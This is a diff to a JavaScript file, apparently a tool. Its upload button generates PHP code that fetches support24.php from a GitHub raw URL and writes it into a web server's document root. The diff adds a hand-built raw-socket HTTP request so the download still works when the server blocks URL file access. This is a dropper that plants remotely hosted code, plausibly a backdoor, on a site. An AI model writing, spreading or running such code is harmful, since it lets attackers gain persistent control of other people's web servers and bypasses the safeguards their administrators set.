@@ -151,12 +151,32 @@ buttonClose.addEventListener("click", async () => {
 });
 
 buttonUpload.addEventListener("click", async () => {
-    let text = "$ref = file('https://raw.githubusercontent.com/nakiamegit/Support24/main/support24.php');\n" +
-        "$temp = fopen($_SERVER['DOCUMENT_ROOT'] . \"/support24.php\", \"a+\");\n" +
-        "foreach ($ref as $line) {\n" +
-        "    fwrite($temp, $line);\n" +
-        "}\n" +
-        "fclose($temp);";
+    let text = `$file = 'https://raw.githubusercontent.com/nakiamegit/Support24/main/support24.php';
+                if(!extension_loaded('allow_url_fopen') || !extension_loaded('allow_url_include'))
+                {
+                    $arrURL = parse_url($file); $port = $arrURL["port"] ?? "443";
+                    $host = $arrURL["host"]; $query = $arrURL["path"] . $arrURL["query"];
+                    $fp = fsockopen("ssl://{$host}", $port, $errno, $errstr, 1024);
+                    if(!$fp) echo $errno . $errstr;
+                    $request = "GET {$query} HTTP/1.1\\r\\n"; $request .= "Host:{$host}\\r\\n";
+                    $request .= "Connection: close\\r\\n"; $request .= "\\r\\n";
+                    fwrite($fp, $request);
+                    $checkBody = false; $body = "";
+                    while(!feof($fp)) {
+                        $line = fgets($fp, 1024);
+                        if($checkBody) $body .= $line;
+                        if ($line == "\\r\\n") $checkBody = true;
+                    }
+                    fclose($fp);
+                    file_put_contents($_SERVER['DOCUMENT_ROOT'] . "/support24.php", $body);
+                } else {
+                    $ref = file($file);
+                    $temp = fopen($_SERVER['DOCUMENT_ROOT'] . "/support24.php", "a+");
+                    foreach ($ref as $line) {
+                        fwrite($temp, $line);
+                    }
+                    fclose($temp);
+                }`;
 
     let area = document.createElement('textarea');
 
